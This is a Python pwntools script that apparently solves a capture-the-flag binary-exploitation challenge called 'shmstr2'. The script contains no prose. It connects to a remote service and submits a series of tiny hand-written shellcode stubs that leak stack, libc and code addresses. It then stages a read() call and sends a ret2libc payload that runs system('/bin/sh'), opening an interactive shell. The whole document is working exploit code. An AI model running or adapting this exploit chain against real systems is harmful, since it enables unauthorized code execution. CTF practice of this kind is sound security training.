#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '151.236.114.211', 17183
binary = './shmstr2'
brkpts = '''
b *0x565567dd
'''

elf = ELF("shmstr2")
libc = ELF("libc.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "i386"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary)
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))

if __name__ == "__main__":
    s = asm("""
    pop edx
    push edx
    push esp
    pop eax
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    inc ebp
    dec ebp
    """)
    add(s)
    run(0)
    io.recvuntil("Shellcode return code = ")
    leak = int(io.recvline().strip(),16)
    log.success("leak = " + hex(leak))
    s = asm("""
            push esi
            pop eax
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            inc ebp
            dec ebp
            """)
    add(s)
    run(1)
    io.recvuntil("Shellcode return code = ")
    libc.address = int(io.recvline().strip(),16) - 0x1b0000
    log.success("libc = " + hex(libc.address))
    s = asm("""
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            pop eax
            push eax
            """)
    add(s)
    run(2)
    io.recvuntil("Shellcode return code = ")
    code = int(io.recvline().strip(),16) - 0x17df
    log.success("code = " + hex(code))

    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh'))
    read_plt = code + 0x1150

    s = asm("""
        pop ecx
        pop edx
        dec edx
        dec edx
        push ebx
        push ebx
        push ebp
        push edx
        push ecx
        popa
        push eax
        push ecx
        push edx
        push ebx
        push ebp
        push edi
        """)
    add(s)
    run(3)
    bss = code + 0x44e0
    pay = asm("""
            push {}
            pop eax
            xor al, 0x70
            push ebp
            push ebp
            push esi
            push edi
            push eax
            inc ebp
            dec ebp
            inc ecx
            """.format(read_plt))
    add(pay)
    #gdb.attach(io)
    run(4)

    payload = p32(0xdeadbeef) + p32(system) + p32(0xdeadbeef) + p32(binsh)
    sl(payload)
    io.interactive()
